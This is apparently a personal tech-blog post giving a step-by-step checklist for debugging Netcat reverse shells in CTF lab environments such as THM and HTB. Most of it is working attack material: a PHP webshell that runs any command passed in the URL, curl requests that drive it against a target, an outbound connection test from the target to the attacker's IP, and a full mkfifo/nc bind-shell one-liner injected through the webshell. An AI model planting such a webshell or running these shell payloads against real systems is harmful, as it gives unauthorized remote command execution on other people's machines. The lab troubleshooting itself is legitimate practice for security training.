---
title: "Reverse Shell Sanity Check (Netcat)"
description: "Checklists for reverse shell with Netcat."
pubDate: 2026-05-23
tags: ["tech", "backend", "networking"]
---

Reverse shell can be annoying to debug as it tends to fail silently. Here is a step-by-step checklist for when your reverse shell payload fires but nothing connects back. This is based on shell.phtml file on the target's machine:

```h
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

## 1. Confirm Code Execution Works
Before blaming the network, make sure the shell/webshell is actually executing commands.

```bash
curl "http://<target>/shell.phtml?cmd=id"
curl "http://<target>/shell.phtml?cmd=whoami"
```
- [ ] Command output returns correctly
- [ ] If no output at all → the problem is execution, not networking. Stop here and debug the injection point instead.

## 2. Get the Correct IP to Listen On
If you're on a VPN (THM/HTB/etc.), use the tunnel interface IP, not your LAN or public IP.

```bash
ip a show tun0
```
- [ ] Found your `tun0` IP (usually `10.x.x.x` or `192.168.x.x` in VPN range)
- [ ] Confirmed it's *not* your local LAN IP (e.g. `192.168.1.x` home network)
- [ ] Confirmed it's *not* your public IP unless you're doing port forwarding

## 3. Check If Your Port Is Available
Make sure nothing else is already bound to the port you want to use.

```bash
ss -tulnp | grep <port>
# or
sudo lsof -i :<port>
```
- [ ] Port is free (no output = free)
- [ ] If busy: kill the process or pick a different port
- [ ] Avoid ports <1024 unless running with `sudo` (privileged ports)

## 4. Start the Listener
```bash
nc -lvnp <port>
```
- [ ] Listener starts without "address already in use" error
- [ ] Listener stays open and waiting (doesn't exit immediately)

## 5. Test Network Reachability (Target → You)
Before troubleshooting the reverse shell payload itself, confirm the target can even reach you at all.

**ICMP test (routing check):**
```bash
curl "http://<target>/shell.phtml?cmd=ping+-c+2+<your_ip>"
```
- [ ] Ping replies come back → routing is fine, move to TCP-specific checks
- [ ] No replies at all → deeper routing/VPN issue, double check you're on the right VPN and IP

**TCP test (with tcpdump watching):**
```bash
sudo tcpdump -ni tun0 host <target_ip>
```
Then trigger a simple outbound connection from target:
```bash
curl "http://<target>/shell.phtml?cmd=curl+-v+--max-time+5+<your_ip>:<port>"
```
- [ ] SYN packet shows up in tcpdump → target is attempting the connection
- [ ] Nothing shows up at all → likely egress filtering on target (try common ports: 443, 80, 53)

## 6. Check THE Firewall
The target side can be totally fine while your own machine silently drops the inbound connection.

```bash
sudo ufw status
```
- [ ] ufw is inactive, OR
- [ ] ufw has an explicit allow rule for your listening port:
```bash
sudo ufw allow <port>/tcp
```
- [ ] Also check `iptables` if not using ufw:
```bash
sudo iptables -L -n | grep <port>
```

## 7. Still Nothing? Try a Bind Shell Instead
If outbound TCP is fully blocked on the target regardless of port, flip the direction the\en have the target listen, and connect to it instead (since inbound HTTP clearly already works).

```bash
curl "http://<target>/shell.phtml?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+-lvnp+<port>+>/tmp/f"
```
Then from your machine:
```bash
nc <target_ip> <port>
```

---

## TL;DR Order of Operations
1. Confirm command execution works
2. Get the right IP (`tun0`, not LAN/public)
3. Check port availability locally
4. Start listener
5. Test reachability (ICMP → TCP with tcpdump)
6. **Check your own firewall** ← the one everyone forgets
7. Fall back to bind shell if outbound is fully blocked
